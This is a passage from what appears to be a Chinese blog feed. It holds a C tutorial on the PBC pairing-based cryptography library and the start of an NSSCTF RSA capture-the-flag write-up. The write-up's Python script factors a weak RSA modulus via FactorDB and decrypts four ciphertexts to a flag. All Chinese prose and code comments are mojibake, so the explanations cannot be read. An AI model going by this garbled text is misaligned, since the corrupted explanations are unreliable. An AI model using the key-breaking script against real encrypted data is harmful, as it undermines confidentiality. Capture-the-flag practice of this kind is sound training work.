class="hljs-string">&quot;sign0 1\n&quot;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">pairing_t</span> pairing;<br>    pairing_init_set_buf(pairing, TYPEA_PARAMS, <span class="hljs-built_in">strlen</span>(TYPEA_PARAMS));<br><span class="hljs-comment">// å®šä¹‰ç¾¤å…ƒç´ </span><br>    <span class="hljs-type">element_t</span> g, h, result1, result2, result3;<br>    <span class="hljs-type">element_t</span> a, b;<br><br>    <span class="hljs-comment">// åˆå§‹åŒ–ç¾¤å…ƒç´ </span><br>    element_init_G1(g, pairing);<br>    element_init_G1(h, pairing);<br>    element_init_GT(result1, pairing);<br>    element_init_GT(result2, pairing);<br>    element_init_GT(result3, pairing);<br>    element_init_Zr(a, pairing);<br>    element_init_Zr(b, pairing);<br><br>    <span class="hljs-comment">// ç”Ÿæˆéšæœºå…ƒç´ </span><br>    element_random(g);<br>    element_random(h);<br>    element_random(a);<br>    element_random(b);<br><br>    <span class="hljs-comment">// è®¡ç®—e(g,h)^(a*b)</span><br>    pairing_apply(result3, g, h, pairing);<br>    element_pow_zn(result3, result3, a);<br>    element_pow_zn(result3, result3, b);<br><br>    <span class="hljs-comment">// è®¡ç®—g^aå’Œg^b</span><br>    element_pow_zn(g, g, a);<br>    element_pow_zn(h, h, b);<br><br>    <span class="hljs-comment">// è®¡ç®—e(g^a, h^b)</span><br>    pairing_apply(result1, g, h, pairing);<br>    pairing_apply(result2, h, g, pairing);<br><br><br><br>    <span class="hljs-comment">// è¾“å‡ºç»“æœ</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Result of pairing e(g^a, h^b): &quot;</span>);<br>    element_printf(<span class="hljs-string">&quot;%B\n&quot;</span>, result1);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Result of pairing e(h^b, g^a): &quot;</span>);<br>    element_printf(<span class="hljs-string">&quot;%B\n&quot;</span>, result2);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Result of pairing e(g, h)^(a*b): &quot;</span>);<br>    element_printf(<span class="hljs-string">&quot;%B\n&quot;</span>, result3);<br><br>    <span class="hljs-comment">// æ¸…ç†å…ƒç´ </span><br>    element_clear(g);<br>    element_clear(h);<br>    element_clear(result1);<br>    element_clear(result2);<br>    element_clear(result3);<br>    element_clear(a);<br>    element_clear(b);<br>    pairing_clear(pairing);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="ä½¿ç”¨"><a class="markdownIt-Anchor" href="#ä½¿ç”¨"></a> ä½¿ç”¨</h2><h3 id="pairingåˆå§‹åŒ–"><a class="markdownIt-Anchor" href="#pairingåˆå§‹åŒ–"></a> pairingåˆå§‹åŒ–</h3><p>åŒçº¿æ€§é…å¯¹ä¸€èˆ¬ä½¿ç”¨çš„æ˜¯pbcåº“ä¸­çš„Type-A<br />è¿™ä¸€éƒ¨åˆ†ç®—æ˜¯å›ºå®šçš„ã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> TYPEA_PARAMS                                           \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;type a\n&quot;</span>                                                 \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;q 87807107996633125224377819847540498158068831994142082&quot;</span>  \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;1102865339926647563088022295707862517942266222142315585&quot;</span>  \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;8769582317459277713367317481324925129998224791\n&quot;</span>         \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;h 12016012264891146079388821366740534204802954401251311&quot;</span>  \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;822919615131047207289359704531102844802183906537786776\n&quot;</span> \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;r 730750818665451621361119245571504901405976559617\n&quot;</span>     \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;exp2 159\n&quot;</span>                                               \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;exp1 107\n&quot;</span>                                               \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;sign1 1\n&quot;</span>                                                \</span><br><span class="hljs-meta">    <span class="hljs-string">&quot;sign0 1\n&quot;</span></span><br><br><span class="hljs-type">pairing_t</span> pairing;<br>pairing_init_set_buf(pairing, TYPEA_PARAMS, <span class="hljs-built_in">strlen</span>(TYPEA_PARAMS));<br></code></pre></td></tr></table></figure><h3 id="å…ƒç´ åˆå§‹åŒ–"><a class="markdownIt-Anchor" href="#å…ƒç´ åˆå§‹åŒ–"></a> å…ƒç´ åˆå§‹åŒ–</h3><p>ä¸€ä¸ªpairingé‡Œæœ‰ä¸€èˆ¬æœ‰ä¸¤ä¸ªç¾¤<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>G</mi><mn>1</mn></msub><mo separator="true">,</mo><msub><mi>G</mi><mn>2</mn></msub></mrow><annotation encoding="application/x-tex">G_1,G_2</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ã€‚æŒ‰å®˜æ–¹è¯´æ³•ï¼Œ<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msub><mi>G</mi><mn>1</mn></msub></mrow><annotation encoding="application/x-tex">G_1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">G</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span></span></span></span>ä¸ºå°çš„é‚£ä¸ªç¾¤ï¼Œä½¿ç”¨çš„æ—¶å€™çœ‹å…·ä½“æƒ…å†µã€‚<br />å…ƒç´ åˆå§‹åŒ–æœ‰è¿™ä¹ˆå‡ ä¸ªå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">element_init_G1</span><span class="hljs-params">(<span class="hljs-type">element_t</span> e, <span class="hljs-type">pairing_t</span> pairing)</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">element_init_G2</span><span class="hljs-params">(<span class="hljs-type">element_t</span> e, <span class="hljs-type">pairing_t</span> pairing)</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">element_init_GT</span><span class="hljs-params">(<span class="hljs-type">element_t</span> e, <span class="hljs-type">pairing_t</span> pairing)</span><br>    Initialize e to be an element of the group G1, G2 or GT of pairing.<br>    è¿™ä¸ªä¸€èˆ¬æ˜¯ç”¨äºæœ€åé…å¯¹çš„ç»“æœã€‚<br><span class="hljs-type">void</span> <span class="hljs-title function_">element_init_Zr</span><span class="hljs-params">(<span class="hljs-type">element_t</span> e, <span class="hljs-type">pairing_t</span> pairing)</span><br>    Initialize e to be an element of the ring Z_r of pairing. r is the order of the groups G1, G2 and GT that are involved in the pairing.<br>    ä¸€èˆ¬ç”¨äºæŒ‡æ•°éƒ¨åˆ†ã€‚<br><span class="hljs-type">void</span> <span class="hljs-title function_">element_init_same_as</span><span class="hljs-params">(<span class="hljs-type">element_t</span> e, <span class="hljs-type">element_t</span> e2)</span><br>    Initialize e to be an element of the algebraic structure that e2 lies in.<br><span class="hljs-type">void</span> <span class="hljs-title function_">element_clear</span><span class="hljs-params">(<span class="hljs-type">element_t</span> e)</span><br>    Free the space occupied by e. Call this when the variable e is no longer needed.<br></code></pre></td></tr></table></figure><p>åœ¨åˆå§‹åŒ–åå°±å¯ä»¥å¯¹å…ƒç´ è¿›è¡Œå„ç§æ“ä½œå•¦ã€‚</p><h3 id="å…ƒç´ èµ‹å€¼"><a class="markdownIt-Anchor" href="#å…ƒç´ èµ‹å€¼"></a> å…ƒç´ èµ‹å€¼</h3><p>pbcä¸­æœ‰å¾ˆå¤šèµ‹å€¼æ“ä½œï¼Œéå¸¸çµæ´»ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">element_set0</span><span class="hljs-params">(<span class="hljs-type">element_t</span> e)</span><br>    Set e to zero.<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">element_set1</span><span class="hljs-params">(<span class="hljs-type">element_t</span> e)</span><br>    Set e to one.<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">element_set_si</span><span class="hljs-params">(<span class="hljs-type">element_t</span> e, <span class="hljs-type">signed</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> i)</span><br>    Set e to i.<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">element_set</span><span class="hljs-params">(<span class="hljs-type">element_t</span> e, <span class="hljs-type">element_t</span> a)</span><br>    Set e to a.<br><br>å¯ä»¥è·ŸGMPåº“ä¸­çš„<span class="hljs-type">mpz_t</span>äº’ç›¸è½¬æ¢<br><span class="hljs-type">void</span> <span class="hljs-title function_">element_set_mpz</span><span class="hljs-params">(<span class="hljs-type">element_t</span> e, <span class="hljs-type">mpz_t</span> z)</span><br>    Set e to z.<br><span class="hljs-type">void</span> <span class="hljs-title function_">element_to_mpz</span><span class="hljs-params">(<span class="hljs-type">mpz_t</span> z, <span class="hljs-type">element_t</span> e)</span><br>    Converts e to a GMP integer z <span class="hljs-keyword">if</span> such an operation makes sense<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">element_from_hash</span><span class="hljs-params">(<span class="hljs-type">element_t</span> e, <span class="hljs-type">void</span> *data, <span class="hljs-type">int</span> len)</span><br>    Generate an element e deterministically from the len bytes stored in the buffer data.<br>    ä½¿ç”¨æ—¶å€™è¦å¼ºåˆ¶å°†dataè½¬ä¸º<span class="hljs-type">void</span> *ï¼š<span class="hljs-title function_">element_from_hash</span><span class="hljs-params">(e, (<span class="hljs-type">void</span> *)hash_str, hash_str_length)</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">element_random</span><span class="hljs-params">(<span class="hljs-type">element_t</span> e)</span>;<br>    éšæœºé€‰å–ç¾¤ä¸­å…ƒç´ <br><br></code></pre></td></tr></table></figure><h3 id="è¿ç®—"><a class="markdownIt-Anchor" href="#è¿ç®—"></a> è¿ç®—</h3><p>è¿™é‡Œå°±åˆ—ä¸¾ä¸€äº›å¸¸ç”¨çš„è¿ç®—</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//åŠ æ³•n=a+b</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">element_add</span><span class="hljs-params">(<span class="hljs-type">element_t</span> n, <span class="hljs-type">element_t</span> a, <span class="hljs-type">element_t</span> b)</span>;<br><br><span class="hljs-comment">//å‡æ³•n=a-b</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">element_sub</span><span class="hljs-params">(<span class="hljs-type">element_t</span> n, <span class="hljs-type">element_t</span> a, <span class="hljs-type">element_t</span> b)</span>;<br><br><span class="hljs-comment">//ä¹˜æ³•n=a*b</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">element_mul</span><span class="hljs-params">(<span class="hljs-type">element_t</span> n, <span class="hljs-type">element_t</span> a, <span class="hljs-type">element_t</span> b)</span>;<br><br><span class="hljs-comment">//æ•°ä¹˜n=z*a</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">element_mul_mpz</span><span class="hljs-params">(<span class="hljs-type">element_t</span> n, <span class="hljs-type">element_t</span> a, <span class="hljs-type">mpz_t</span> z)</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">element_mul_si</span><span class="hljs-params">(<span class="hljs-type">element_t</span> n, <span class="hljs-type">element_t</span> a, <span class="hljs-type">signed</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> z)</span>;<br><br><br><span class="hljs-comment">//å…ƒç´ æ•°ä¹˜n=z*a</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">element_mul_zn</span><span class="hljs-params">(<span class="hljs-type">element_t</span> c, <span class="hljs-type">element_t</span> a, <span class="hljs-type">element_t</span> z)</span>;<br><span class="hljs-comment">//æ³¨æ„è¿™é‡Œçš„å…ƒç´ zå¿…é¡»ä¸ºæ•´æ•°modç¯ï¼Œå³Zrä¸‹ã€‚</span><br><span class="hljs-comment">//å³zç»è¿‡element_init_Zr(element_t e, pairing_t pairing)</span><br><br><span class="hljs-comment">//é™¤æ³•n=a/b</span><br> <span class="hljs-type">void</span> <span class="hljs-title function_">element_div</span><span class="hljs-params">(<span class="hljs-type">element_t</span> n, <span class="hljs-type">element_t</span> a, <span class="hljs-type">element_t</span> b)</span>;<br><br><span class="hljs-comment">//å€’æ•°oré€†å…ƒn=a^&#123;-1&#125;</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">element_invert</span><span class="hljs-params">(<span class="hljs-type">element_t</span> n, <span class="hljs-type">element_t</span> a)</span>;<br><br><span class="hljs-comment">//å¹‚oræ¬¡æ–¹x=a^n,nä¸ºZrä¸‹çš„</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">element_pow_zn</span><span class="hljs-params">(<span class="hljs-type">element_t</span> x, <span class="hljs-type">element_t</span> a, <span class="hljs-type">element_t</span> n)</span>;<br><br><span class="hljs-comment">//ç­‰äºa==b,ç­‰äºè¿”å›0ï¼Œä¸ç­‰äºè¿”å›1</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">element_cmp</span><span class="hljs-params">(<span class="hljs-type">element_t</span> a, <span class="hljs-type">element_t</span> b)</span>;<br><br></code></pre></td></tr></table></figure><h3 id="å…ƒç´ è¾“å‡º"><a class="markdownIt-Anchor" href="#å…ƒç´ è¾“å‡º"></a> å…ƒç´ è¾“å‡º</h3><p>è¿™é‡Œå°±è¯´ä¸€ä¸‹æˆ‘ç”¨è¿‡çš„</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">element_printf</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *format, â€¦)</span>;<br>    ä¸€èˆ¬ç”¨æ³•ä¸º element_printf(<span class="hljs-string">&quot;%B\n&quot;</span>,e);<br><br>ä¸‹é¢è¿™ä¸‰ä¸ªå‡½æ•°æˆ‘ç”¨æ¥å°†å…ƒç´ ä¿å­˜ä¸ºæ–‡ä»¶<br><span class="hljs-type">int</span> <span class="hljs-title function_">element_length_in_bytes</span><span class="hljs-params">(<span class="hljs-type">element_t</span> e)</span><br>    Returns the length in bytes the element e will take to represent<br><span class="hljs-type">int</span> <span class="hljs-title function_">element_to_bytes</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *data, <span class="hljs-type">element_t</span> e)</span><br>    Converts e to byte, writing the result in the buffer data. The number of bytes it will write can be determined from calling <span class="hljs-title function_">element_length_in_bytes</span><span class="hljs-params">()</span>. Returns number of bytes written.<br><span class="hljs-type">int</span> <span class="hljs-title function_">element_from_bytes</span><span class="hljs-params">(<span class="hljs-type">element_t</span> e, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *data)</span><br>    Reads e from the buffer data, and returns the number of bytes read.<br>æˆ‘ç”¨GPTç”Ÿæˆçš„ä½¿ç”¨æ–¹æ³•ï¼ˆäº²æµ‹å¯ç”¨ï¼‰ï¼š<br><span class="hljs-type">void</span> <span class="hljs-title function_">save_element_to_file</span><span class="hljs-params">(<span class="hljs-type">element_t</span> e, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename)</span><br>&#123;<br>    <span class="hljs-type">int</span> size = element_length_in_bytes(e);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *data = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(size);<br><br>    element_to_bytes(data, e);<br>    FILE *file = fopen(filename, <span class="hljs-string">&quot;wb&quot;</span>);<br>    <span class="hljs-keyword">if</span> (file != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        fwrite(data, <span class="hljs-number">1</span>, size, file);<br>        fclose(file);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(data);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">load_element_from_file</span><span class="hljs-params">(<span class="hljs-type">element_t</span> e, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *filename)</span><br>&#123;<br>    <span class="hljs-type">int</span> size = element_length_in_bytes(e);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *data = (<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *)<span class="hljs-built_in">malloc</span>(size);<br><br>    FILE *file = fopen(filename, <span class="hljs-string">&quot;rb&quot;</span>);<br>    <span class="hljs-keyword">if</span> (file != <span class="hljs-literal">NULL</span>)<br>    &#123;<br>        fread(data, <span class="hljs-number">1</span>, size, file);<br>        element_from_bytes(e, data);<br>        fclose(file);<br>    &#125;<br>    <span class="hljs-built_in">free</span>(data);<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>c</category>
      
      <category>PBC</category>
      
    </categories>
    
    
    <tags>
      
      <tag>c</tag>
      
      <tag>PBC</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Xennyçš„RSAé¢˜å•</title>
    <link href="/2024/12/05/XennyRSA/"/>
    <url>/2024/12/05/XennyRSA/</url>
    
    <content type="html"><![CDATA[<h1 id="é¢˜ç›®åœ°å€"><a class="markdownIt-Anchor" href="#é¢˜ç›®åœ°å€"></a> é¢˜ç›®åœ°å€ï¼š</h1><p><a href="https://www.nssctf.cn/problem/sheet/6">Xennyçš„RSAé¢˜å• | NSSCTF</a></p><h1 id="æŸé¹­æ¯-2021è¯•è¯•å¤§æ•°æ®åˆ†è§£"><a class="markdownIt-Anchor" href="#æŸé¹­æ¯-2021è¯•è¯•å¤§æ•°æ®åˆ†è§£"></a> [æŸé¹­æ¯ 2021]è¯•è¯•å¤§æ•°æ®åˆ†è§£?</h1><h2 id="é¢˜ç›®"><a class="markdownIt-Anchor" href="#é¢˜ç›®"></a> é¢˜ç›®</h2><p>public.pem</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli"><span class="hljs-params">-----BEGIN</span> PUBLIC KEY<span class="hljs-params">-----</span><br>MEEwDQYJKoZIhvcNAQEBBQADMAAwLQImB7P6jgDCkl34tsJ1D1oiGKDHVvftOEqX<br><span class="hljs-string">/N1kT/dj9UyNNJkEELECAwGGlw==</span><br><span class="hljs-params">-----END</span> PUBLIC KEY<span class="hljs-params">-----</span><br></code></pre></td></tr></table></figure><p>flag.enc1</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">BhUX<span class="hljs-meta">O8</span>RZzppFl<span class="hljs-number">7</span>Fw<span class="hljs-number">72</span>jbGkEIaH/<span class="hljs-number">6</span>/D<span class="hljs-number">5</span>c<span class="hljs-number">00</span>bYx<span class="hljs-number">1</span>HEAPf<span class="hljs-symbol">N5</span>+BeRII=<br></code></pre></td></tr></table></figure><p>flag.enc2</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">BSiVik1bo999kG2eHzZaVt056rh74oRbbU99OrIE48ds9kQ6AR4</span><span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><p>flag.enc3</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs abnf">BbGPmOvTr8OYCIgwyEpu5b26jGUY2EHZRu2FUSK/cdUmK0Wqkhc<span class="hljs-operator">=</span><br></code></pre></td></tr></table></figure><p>flag.enc4</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gcode">Axu<span class="hljs-symbol">n6</span>PS<span class="hljs-number">3</span>aheoX<span class="hljs-number">8</span><span class="hljs-meta">o3</span><span class="hljs-name">G8</span>e<span class="hljs-number">3</span>mtAxHC+C<span class="hljs-number">6</span>r<span class="hljs-number">95</span>oV<span class="hljs-number">84</span>OQ<span class="hljs-number">8</span>dxsFsx<span class="hljs-symbol">nYcfo0</span>=<br></code></pre></td></tr></table></figure><h2 id="åˆ†æ"><a class="markdownIt-Anchor" href="#åˆ†æ"></a> åˆ†æ</h2><p>é¢˜ç›®ç»™äº†å…¬é’¥æ–‡ä»¶ï¼Œç„¶åå››ä¸ªå¯†æ–‡ï¼Œç»è¿‡äº†base64ç¼–ç </p><p>æˆ‘ä»¬å…ˆè¯»å–å…¬é’¥æ–‡ä»¶ï¼Œå¾—åˆ°eå’Œnï¼Œçœ‹åˆ°næ¯”è¾ƒå°ï¼Œåœ¨facetordbä¸­å¯ä»¥è¿›è¡Œåˆ†è§£ï¼Œå¯ä»¥å¾—åˆ°p,q</p><p>åé¢è¿›è¡Œå¸¸è§„çš„rsaè§£å¯†</p><p>ä½†æ˜¯æ‰“å°å‡ºmåå‘ç°ä¸æ˜¯ç›´æ¥çš„flag</p><p>è§‚å¯Ÿåˆ°ç¬¬ä¸€ä¸²\00å­—èŠ‚åé¢666cå¼€å¤´ï¼Œåº”è¯¥å°±æ˜¯flag</p><p>æ‰‹åŠ¨æå–äº†ä¸€ä¸‹æ¯ä¸€ä¸²\00åé¢çš„å°±è¡Œäº†</p><h2 id="exp"><a class="markdownIt-Anchor" href="#exp"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> Crypto.PublicKey <span class="hljs-keyword">import</span> RSA<br><span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> factordb.factordb <span class="hljs-keyword">import</span> FactorDB<br>public_key=RSA.importKey(<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./public.pem&quot;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>).read())<br><br>E=public_key.e<br>N=public_key.n<br><span class="hljs-built_in">print</span>(E)<br><span class="hljs-built_in">print</span>(N)<br><br>f=FactorDB(N)<br>f.connect()<br>p,q=f.get_factor_list()<br>c=[]<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>):<br>    c.append(bytes_to_long(b64decode((<span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.enc&#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(i+<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;rb&#x27;</span>).read()))))<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> c:<br>    <span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">pow</span>(i,invert(E,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)),N)))<br><span class="hljs-string">&quot;&quot;&quot;b&#x27;\x02\x88b4Kt\xe4\x1cI\xcf\x8fw/&quot;\x00666c61677b495345432d49&#x27;</span><br><span class="hljs-string">b&#x27;\x02\x1b\xf3\x18\xaf\xe1\xe3\xc7\x19\xa0\x05\xac\xe0N\x007235574d5f473441666276&#x27;</span><br><span class="hljs-string">b&#x27;\x025\x89;\xb0\xbd\x96\tU@\xf2\x0b\xe7+\x00785f6d534d5f556766387a&#x27;</span><br><span class="hljs-string">b&#x27;\x02\xfcu\xcb\n\xcf\x97\x0f\x9e\xbbC\x11\xd7\xdbw\xd9\x0052416f4d6b594350787d&#x27;&quot;&quot;&quot;</span><br>a=<span class="hljs-number">0x666c61677b495345432d497235574d5f473441666276785f6d534d5f556766387a52416f4d6b594350787d</span><br><span class="hljs-built_in">print</span>(long_to_bytes(a))<br><span class="hljs-comment">#b&#x27;flag&#123;ISEC-Ir5WM_G4Afbvx_mSM_Ugf8zRAoMkYCPx&#125;&#x27;</span><br><span class="hljs-comment">#NSSCTF&#123;ISEC-Ir5WM_G4Afbvx_mSM_Ugf8zRAoMkYCPx&#125;</span><br></code></pre></td></tr></table></figure><h1 id="é»‘ç›¾æ¯-2020factor"><a class="markdownIt-Anchor" href="#é»‘ç›¾æ¯-2020factor"></a> [é»‘ç›¾æ¯ 2020]Factor</h1><h2 id="é¢˜ç›®-2"><a class="markdownIt-Anchor" href="#é¢˜ç›®-2"></a> é¢˜ç›®</h2><figure class="highlight 